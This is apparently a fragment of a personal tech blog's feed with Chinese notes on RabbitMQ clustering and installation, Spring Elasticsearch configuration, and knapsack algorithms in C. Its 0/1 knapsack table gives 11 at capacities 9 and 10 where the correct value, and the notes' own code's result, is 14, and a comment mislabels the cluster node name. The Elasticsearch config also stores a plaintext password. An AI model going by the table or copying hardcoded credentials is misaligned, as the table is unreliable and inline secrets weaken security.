class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 如果开启了 RabbitMQ 服务，先关闭服务</span><br>sudo systemctl stop rabbitmq-server<br><br><br><span class="hljs-comment"># 2. 修改 Erlang Cookie 值，强制保存（w! 和 q!）</span><br>vim <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/rabbitmq/</span>.erlang.cookie<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">输入刚才记录的 Cookie 值：VAWCBDXAIOWOXLZSBRYS</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 启动 RabbitMQ 服务</span><br>sudo systemctl start rabbitmq-server<br><br><br><span class="hljs-comment"># 2. 停止、重置、加入、启动</span><br><span class="hljs-comment"># 2.1. 停止</span><br>rabbitmqctl stop_app<br><br><span class="hljs-comment"># 2.2. 重置</span><br>rabbitmqctl reset<br><br><span class="hljs-comment"># 2.3. 加入</span><br>rabbitmqctl join_cluster rabbit@rbmq-node1<br><br><span class="hljs-comment"># 2.4. 启动</span><br>rabbitmqctl start_app<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. rabbitmqctl stop_app：</span><br><span class="hljs-string">1. 停止 RabbitMQ 的应用（注意不是停止整个服务），防止在运行中加入集群导致冲突</span><br><span class="hljs-string">2. rabbitmqctl reset：</span><br><span class="hljs-string">1. 清空本节点的元数据，包括已有的集群状态，这一步是必须的</span><br><span class="hljs-string">3. rabbitmqctl join_cluster rabbit@rbmq-node1</span><br><span class="hljs-string">1. 将当前节点加入名为 rabbit@node01 的 RabbitMQ 集群</span><br><span class="hljs-string">2. rbmp-node1 为中间人，只能写主机名，不能写 IP：</span><br><span class="hljs-string">4. rabbitmqctl start_app：</span><br><span class="hljs-string">1. 启动 RabbitMQ 应用，正式生效，开始作为集群成员工作</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 3. 开机自启动 RabbitMQ 服务</span><br>systemctl enable rabbitmq-server<br></code></pre></td></tr></table></figure><hr><h5 id="2-10-3-检查集群状态"><a href="#2-10-3-检查集群状态" class="headerlink" title="2.10.3. 检查集群状态"></a>2.10.3. 检查集群状态</h5><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rabbitmqctl cluster_status</span><br></code></pre></td></tr></table></figure><hr><h1 id="—"><a href="#—" class="headerlink" title="—-"></a>—-</h1><h4 id="0-1-虚拟空间"><a href="#0-1-虚拟空间" class="headerlink" title="0.1. 虚拟空间"></a>0.1. 虚拟空间</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250511112907036.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250511112921622.png"></p><p>不同消息队列根据路由键进行分配到队列</p><p>起名：<br>exchange.direct.order</p><p>exchange.direct.order.backup<br>queue.direct.order.backup</p><p>这个能直接发布信息<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250510215227990.png"></p><p>对这个图<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250510215558278.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250510220812312.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250510194722644.png"></p><h4 id="0-2-环境要求"><a href="#0-2-环境要求" class="headerlink" title="0.2. 环境要求"></a>0.2. 环境要求</h4><ol><li>&#x3D;&#x3D;系统要求&#x3D;&#x3D;：<ol><li>Ubuntu 22.04</li><li>开放 5672、15672、4369、25672 TCP端口</li></ol></li><li>&#x3D;&#x3D;软件要求&#x3D;&#x3D;：<ol><li>RabbitMQ 4.0.1</li><li>Erlang 26.2</li></ol></li></ol><hr><h4 id="0-3"><a href="#0-3" class="headerlink" title="0.3."></a>0.3.</h4><hr><h3 id="1-安装-Erlang（RabbitMQ-的运行强依赖）"><a href="#1-安装-Erlang（RabbitMQ-的运行强依赖）" class="headerlink" title="1. 安装 Erlang（RabbitMQ 的运行强依赖）"></a>1. 安装 Erlang（RabbitMQ 的运行强依赖）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 设置临时代理</span><br><span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> no_proxy=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> HTTP_PROXY=<span class="hljs-variable">$http_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> HTTPS_PROXY=<span class="hljs-variable">$https_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> NO_PROXY=<span class="hljs-variable">$no_proxy</span><br><br><br><span class="hljs-comment"># 2. 安装必要工具</span><br><span class="hljs-built_in">sudo</span> apt-get install -y curl gnupg apt-transport-https<br><br><br><span class="hljs-comment"># 3. 添加 RabbitMQ 包签名</span><br>curl -fsSL https://packagecloud.io/rabbitmq/erlang/gpgkey | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /etc/apt/trusted.gpg.d/rabbitmq_erlang.gpg &amp;&amp; curl -fsSL https://packagecloud.io/rabbitmq/rabbitmq-server/gpgkey | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /etc/apt/trusted.gpg.d/rabbitmq_server.gpg<br><br><br><span class="hljs-comment"># 4. 添加 APT 源</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb https://packagecloud.io/rabbitmq/erlang/ubuntu/ <span class="hljs-subst">$(lsb_release -sc)</span> main&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/rabbitmq_erlang.list &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb https://packagecloud.io/rabbitmq/rabbitmq-server/ubuntu/ <span class="hljs-subst">$(lsb_release -sc)</span> main&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/rabbitmq_server.list<br><br><br><span class="hljs-comment"># 5. 更新索引</span><br><span class="hljs-built_in">sudo</span> apt-get update<br><br><br><br><span class="hljs-comment"># 2. 添加 Erlang 仓库</span><br>wget -O- https://packages.erlang-solutions.com/ubuntu/erlang_solutions.asc | <span class="hljs-built_in">sudo</span> apt-key add -<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb https://packages.erlang-solutions.com/ubuntu <span class="hljs-subst">$(lsb_release -sc)</span> contrib&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/erlang.list<br><br><br><span class="hljs-comment"># 2. 更新并安装 Erlang</span><br><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt install erlang -y<br></code></pre></td></tr></table></figure><h1 id="三、工具"><a href="#三、工具" class="headerlink" title="三、工具"></a>三、工具</h1><h3 id="1-RabbitMQ-控制台"><a href="#1-RabbitMQ-控制台" class="headerlink" title="1. RabbitMQ 控制台"></a>1. RabbitMQ 控制台</h3><h4 id="1-1-访问方式"><a href="#1-1-访问方式" class="headerlink" title="1.1. 访问方式"></a>1.1. 访问方式</h4><p>当我们部署完 RabbitMQ 后，可以访问服务器节点： <a href="http://192.168.136.7:15672/">http://192.168.136.7:15672</a><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ARabbitMQ%20%E5%9F%BA%E7%A1%80/image-20250510173743688.png"></p><hr><h1 id="四、补充："><a href="#四、补充：" class="headerlink" title="四、补充："></a>四、补充：</h1><h3 id="1-相关网站"><a href="#1-相关网站" class="headerlink" title="1. 相关网站"></a>1. 相关网站</h3><ol><li>&#x3D;&#x3D;Erlang 与 RabbitMQ 版本兼容&#x3D;&#x3D;<ol><li><a href="https://www.rabbitmq.com/docs/which-erlang">https://www.rabbitmq.com/docs/which-erlang</a></li></ol></li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511104732641.png"></p><h3 id="2-消息可以被其他消费者读取吗？"><a href="#2-消息可以被其他消费者读取吗？" class="headerlink" title="2. 消息可以被其他消费者读取吗？"></a>2. <strong>消息可以被其他消费者读取吗？</strong></h3><ul><li><p><strong>默认行为</strong>：如果消费者没有确认消息（没有发送 ACK），那么消息会继续被认为是处于未确认（unacked）状态。在 RabbitMQ 中，这条消息不会被其他消费者读取，直到消息超时或者消费者确认（ACK）或者拒绝（NACK）该消息。</p></li><li><p><strong>消息重试</strong>：如果消费者崩溃或连接断开，RabbitMQ 会检测到该消费者没有确认消息（ACK），然后将该消息重新放回队列，待其他消费者处理。这种机制保证了消息的可靠性，即使消费者出现问题，消息也不会丢失。</p></li></ul><h3 id="3-如何控制消息的重新投递？"><a href="#3-如何控制消息的重新投递？" class="headerlink" title="3. 如何控制消息的重新投递？"></a>3. <strong>如何控制消息的重新投递？</strong></h3><ul><li><strong>消息超时机制</strong>（<code>time-to-live</code>）：RabbitMQ 不会自动对未确认消息进行超时处理，除非设置了超时机制。但可以设置 <strong>消费者确认超时</strong> 或通过某些机制来控制消息的重试。</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h3 id="1-常见网站"><a href="#1-常见网站" class="headerlink" title="1. 常见网站"></a>1. 常见网站</h3><ol><li>RabbitMQ 官网</li><li>RabbitMQ 安装文档<ol><li><a href="https://www.rabbitmq.com/docs/install-debian">https://www.rabbitmq.com/docs/install-debian</a></li></ol></li></ol><h3 id="2-交换机、队列命名"><a href="#2-交换机、队列命名" class="headerlink" title="2. 交换机、队列命名"></a>2. 交换机、队列命名</h3><p>命名模版：&#96;[项目名].[业务名].[功能名].[类型]</p><p>常见类型：</p><ol><li>主交换机：<code>exchange</code></li><li>主队列：<code>queue</code></li><li>死信交换机：<code>dlx.exchange</code></li><li>死信队列：<code>dlx.queue</code></li><li>备份交换机：<code>backup.exchange</code></li><li>备份队列：<code>backup.queue</code></li></ol><p>举例说明：</p><ol><li>支付创建：<code>payment.create.exchange</code></li><li>支付超时取消：<code>payment.timeout.exchange</code></li><li>支付回调通知：<code>payment.notify.exchange</code></li></ol>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>消息队列</category>
      
      <category>RabbitMQ</category>
      
      <category>RabbitMQ 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Data Elasticsearch</title>
    <link href="/2025/04/22/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20Elasticsearch/"/>
    <url>/2025/04/22/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20Elasticsearch/</url>
    
    <content type="html"><![CDATA[<h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><h3 id="创建-Spring-Web-项目并添加-ES-相关依赖"><a href="#创建-Spring-Web-项目并添加-ES-相关依赖" class="headerlink" title="创建 Spring Web 项目并添加 ES 相关依赖"></a>创建 Spring Web 项目并添加 ES 相关依赖</h3><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li><li>&#x3D;&#x3D;NoSQL&#x3D;&#x3D;<ol><li>Spring Data Elasticsearch</li></ol></li></ol><hr><h3 id="配置-Elasticsearch-连接"><a href="#配置-Elasticsearch-连接" class="headerlink" title="配置 Elasticsearch 连接"></a>配置 Elasticsearch 连接</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">spring</span><span class="hljs-punctuation">:  </span><br>  <span class="hljs-attribute">elasticsearch</span><span class="hljs-punctuation">:  </span><br>    <span class="hljs-attribute">uris</span><span class="hljs-punctuation">:</span> <span class="hljs-string">https://192.168.136.8:9200  </span><br>    <span class="hljs-attribute">username</span><span class="hljs-punctuation">:</span> <span class="hljs-string">elastic  </span><br>    <span class="hljs-attribute">password</span><span class="hljs-punctuation">:</span> <span class="hljs-string">wq666666  </span><br>    <span class="hljs-attribute">connection-timeout</span><span class="hljs-punctuation">:</span> <span class="hljs-string">5s  </span><br>    <span class="hljs-attribute">socket-timeout</span><span class="hljs-punctuation">:</span> <span class="hljs-string">30s</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>ELK 三件套</category>
      
      <category>ElasticSearch</category>
      
      <category>Spring Data Elasticsearch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：算法分析与设计</title>
    <link href="/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/04/20/%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="1-背包问题"><a href="#1-背包问题" class="headerlink" title="1. 背包问题"></a>1. 背包问题</h3><h4 id="1-1-分数背包"><a href="#1-1-分数背包" class="headerlink" title="1.1. 分数背包"></a>1.1. 分数背包</h4><h5 id="1-1-1-题目描述"><a href="#1-1-1-题目描述" class="headerlink" title="1.1.1. 题目描述"></a>1.1.1. 题目描述</h5><p>给定一个背包，其最大承重为 10，且有 3 件物品可供选择。每件物品的重量和价值如下：</p><ul><li>物品 1：重量 2，价值 3</li><li>物品 2：重量 3，价值 4</li><li>物品 3：重量 4，价值 7<br><strong>物品可以进行分割，但不能无限取</strong>，请求解能够放入背包的最大价值。</li></ul><hr><h5 id="1-1-2-贪心法（代码）"><a href="#1-1-2-贪心法（代码）" class="headerlink" title="1.1.2. 贪心法（代码）"></a>1.1.2. 贪心法（代码）</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;</p><ol><li>首先计算每个物品的单位重量价值（即 <code>v/w</code>），并根据该比值将物品<strong>按从高到低的顺序排序</strong>。这是因为单位价值越高的物品，在有限的背包容量中越“划算”，优先选择可以最大化总价值。</li><li>接着，从单位价值最高的物品开始，<strong>依次尽可能多地放入背包</strong>。若当前物品还能全部装下，就全部取走；<font color="#ff0000">若背包容量不足，则只取其中的一部分（也就是“分数”）</font>，<font color="#ff0000">直到背包装满为止</font>（与 0&#x2F;1 背包的区别就这一点，0&#x2F;1 背包不能取其中的一部分，背包可能装不满）。</li></ol><p>&#x3D;&#x3D;2.代码示例&#x3D;&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">3</span>;                                       <span class="hljs-comment">// 物品的数量</span><br>    <span class="hljs-type">int</span> capacity = <span class="hljs-number">10</span>;                               <span class="hljs-comment">// 背包的容量</span><br>    <span class="hljs-type">int</span> weight[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;                    <span class="hljs-comment">// 物品的重量，下标从1开始</span><br>    <span class="hljs-type">int</span> value[<span class="hljs-number">4</span>]  = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;;                    <span class="hljs-comment">// 物品的价值，下标从1开始</span><br>    <span class="hljs-type">double</span> ratio[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;                           <span class="hljs-comment">// 用于存放物品的 价值/重量 比</span><br><br>    <span class="hljs-type">int</span> i, j;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;                       <span class="hljs-comment">// 计算每个物品的 价值/重量 比</span><br>        ratio[i] = (<span class="hljs-type">double</span>)value[i] / weight[i];<br>    &#125;<br><br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n - <span class="hljs-number">1</span>; i++) &#123;                   <span class="hljs-comment">// 冒泡排序：按价值重量比 ratio 降序排列，同时交换 weight 和 value</span><br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= n - i; j++) &#123;<br>            <span class="hljs-keyword">if</span> (ratio[j] &lt; ratio[j + <span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-comment">// 交换 ratio</span><br>                <span class="hljs-type">double</span> tmpRatio = ratio[j];<br>                ratio[j] = ratio[j + <span class="hljs-number">1</span>];<br>                ratio[j + <span class="hljs-number">1</span>] = tmpRatio;<br><br>                <span class="hljs-comment">// 交换 weight</span><br>                <span class="hljs-type">int</span> tmpW = weight[j];<br>                weight[j] = weight[j + <span class="hljs-number">1</span>];<br>                weight[j + <span class="hljs-number">1</span>] = tmpW;<br><br>                <span class="hljs-comment">// 交换 value</span><br>                <span class="hljs-type">int</span> tmpV = value[j];<br>                value[j] = value[j + <span class="hljs-number">1</span>];<br>                value[j + <span class="hljs-number">1</span>] = tmpV;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">double</span> maxValue = <span class="hljs-number">0.0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n &amp;&amp; capacity &gt; <span class="hljs-number">0</span>; i++) &#123;    <span class="hljs-comment">// 在物品未遍历完且背包仍有剩余容量的情况下，循环遍历已排序的物品列表</span><br>        <span class="hljs-keyword">if</span> (weight[i] &lt;= capacity) &#123;              <span class="hljs-comment">// 如果当前物品重量小于或等于背包神域容量，则完全放入该物品</span><br>            capacity -= weight[i];<br>            maxValue += value[i];<br>        &#125; <span class="hljs-keyword">else</span> &#123;                                  <span class="hljs-comment">// 如果当前物品重量大于背包剩余容量，则按比例放入该物品</span><br>            maxValue += ratio[i] * capacity;<br>            capacity = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;能够放入背包的最大价值 = %.2f\n&quot;</span>, maxValue);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="1-2-0-1-背包"><a href="#1-2-0-1-背包" class="headerlink" title="1.2. 0&#x2F;1 背包"></a>1.2. 0&#x2F;1 背包</h4><h5 id="1-2-1-题目描述"><a href="#1-2-1-题目描述" class="headerlink" title="1.2.1. 题目描述"></a>1.2.1. 题目描述</h5><p>给定一个背包，其最大承重为 10，且有 3 件物品可供选择。每件物品的重量和价值如下：</p><ul><li>物品 1：重量 2，价值 3</li><li>物品 2：重量 3，价值 4</li><li>物品 3：重量 4，价值 7<br><strong>每个物品只能取一次，且不能分割</strong>，请求能够放入背包的最大价值。</li></ul><hr><h5 id="1-2-2-贪心法"><a href="#1-2-2-贪心法" class="headerlink" title="1.2.2. 贪心法"></a>1.2.2. 贪心法</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;</p><ol><li>首先计算每个物品的单位重量价值（即 <code>v/w</code>），并根据该比值将物品<strong>按从高到低的顺序排序</strong>。这是因为单位价值越高的物品，在有限的背包容量中越“划算”，优先选择可以最大化总价值。</li><li>接着，从单位价值最高的物品开始，<strong>依次尽可能多地放入背包</strong>。若当前物品还能全部装下，就全部取走；<font color="#ff0000">若背包容量不足，则找重量更小的物品</font>，<font color="#ff0000">背包可能装不满</font>（与分数背包的区别就这一点，分数背包可以取其中的一部分，背包要装满）</li></ol><hr><h5 id="1-2-3-动态规划法（代码）"><a href="#1-2-3-动态规划法（代码）" class="headerlink" title="1.2.3. 动态规划法（代码）"></a>1.2.3. 动态规划法（代码）</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;<br>根据当前背包容量判断是否可以放入第 <code>i</code> 个物品，分两种情况讨论：</p><ol><li><font color="#00b0f0">不能放</font>：<ol><li>如果当前容量小于物品 <code>i</code> 的重量，说明放不下，直接继承「相同容量下、前一个物品」的最优解。</li></ol></li><li><font color="#00b0f0">可以放</font>：<ol><li>如果当前容量足够放下物品 <code>i</code>，则需要判断是否“值得”放，对比下面两种选择，取最大值作为当前状态的最优解</li><li><font color="#7030a0">不放当前物品</font>：<ol><li>直接继承「相同容量下、前一个物品」的最优解；</li></ol></li><li><font color="#7030a0">放当前物品</font>：<ol><li>考虑当前物品的价值 + 「剩余容量下、<font color="#ff0000">前一个物品</font>」的最优解</li><li>和完全背包的区别就仅仅在于（☆☆☆）：<ol><li><strong>0&#x2F;1 背包中每种物品只能取一次</strong>，一旦选择就不能再取，因此状态转移时需要参考「<strong>剩余容量下，前一个物品</strong>」的最优解；</li><li>而在<strong>完全背包问题中，物品可以无限次取用</strong>，所以只需考虑「<strong>当前物品在剩余容量下</strong>」的最优解即可。</li></ol></li></ol></li></ol></li></ol><p>&#x3D;&#x3D;2.举例说明&#x3D;&#x3D;<br>在分析问题时，我们通常会构造出一个如下的动态规划表。</p><p>以坐标 (1, 1) 为例，表示当前考虑第 1 个物品，背包容量为 1。由于物品的重量为 2，超过了当前背包容量，因此无法放入，只能继承「相同容量下、前一个物品」的最优解，即 (0, 1) 处的值。</p><p>例如 (2, 6)，表示当前考虑第 2 个物品，背包容量为 6，物品重量为 3。此时我们有两种选择：</p><ul><li><strong>不放该物品</strong>：直接继承「相同容量下、前一个物品」的最优解，即 (1, 6)；</li><li><strong>放入该物品</strong>：当前物品价值为 4，放入后剩余容量为 3，此时我们还可以使用「剩余容量下、<font color="#ff0000">前一个物品</font>」的最优解，即 (1, 3)。因此，总价值为 4 + (1, 3)。<br>最终在这两种选择中取最大值，作为状态 (2, 6) 的最优解。</li></ul><table><thead><tr><th>物品\容量</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td><strong>1（2,3）</strong></td><td>0</td><td>0</td><td>3</td><td>3</td><td>3</td><td>3</td><td>3</td><td>3</td><td>3</td><td>3</td><td>3</td></tr><tr><td><strong>2（3,4）</strong></td><td>0</td><td>0</td><td>3</td><td>4</td><td>4</td><td>7</td><td>7</td><td>7</td><td>7</td><td>7</td><td>7</td></tr><tr><td><strong>3（4,7）</strong></td><td>0</td><td>0</td><td>3</td><td>4</td><td>7</td><td>7</td><td>10</td><td>11</td><td>11</td><td>11</td><td>11</td></tr></tbody></table><p>&#x3D;&#x3D;3.代码示例&#x3D;&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;                <span class="hljs-comment">// 工具函数，取两个数中的最大值</span><br>    <span class="hljs-keyword">return</span> a &gt; b ? a : b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">3</span>;                        <span class="hljs-comment">// 物品个数</span><br>    <span class="hljs-type">int</span> capacity = <span class="hljs-number">10</span>;                <span class="hljs-comment">// 背包容量</span><br>    <span class="hljs-type">int</span> weight[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;     <span class="hljs-comment">// 物品重量，下标从1开始</span><br>    <span class="hljs-type">int</span> value[<span class="hljs-number">4</span>]  = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;;     <span class="hljs-comment">// 物品价值，下标从1开始</span><br><br>    <span class="hljs-type">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">11</span>] = &#123;<span class="hljs-number">0</span>&#125;;               <span class="hljs-comment">// 动态规划数组 a[i][j] 表示在考虑前 i 个物品时，背包容量为 j 时的最大价值。（相当于我们列的表格的每一行，11 是因为虽然最大容量是 10，但容量是从 0 开始的，所以需要 11 个容量点）</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;               <span class="hljs-comment">// 遍历每一个物品</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= capacity; ++j) &#123;    <span class="hljs-comment">// 遍历每一种容量</span><br>            <span class="hljs-keyword">if</span> (j &lt; weight[i]) &#123;                 <span class="hljs-comment">// 必然不选当前物品的情况</span><br>                a[i][j] = a[i - <span class="hljs-number">1</span>][j];<br>            &#125; <span class="hljs-keyword">else</span> &#123;                             <span class="hljs-comment">// 可能选当前物品的情况</span><br>                a[i][j] = <span class="hljs-built_in">max</span>(a[i - <span class="hljs-number">1</span>][j], a[i<span class="hljs-number">-1</span>][j - weight[i]] + value[i]); <span class="hljs-comment">// a[i-1]是核心</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;max = %d\n&quot;</span>, a[n][capacity]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-2-4-回溯法（代码）"><a href="#1-2-4-回溯法（代码）" class="headerlink" title="1.2.4. 回溯法（代码）"></a>1.2.4. 回溯法（代码）</h5><p>&#x3D;&#x3D;1.解题思路&#x3D;&#x3D;<br>回溯法的核心思想是使用 <strong>“深度优先搜索（DFS）+ 剪枝函数”</strong> 构建决策树：</p><ol><li><font 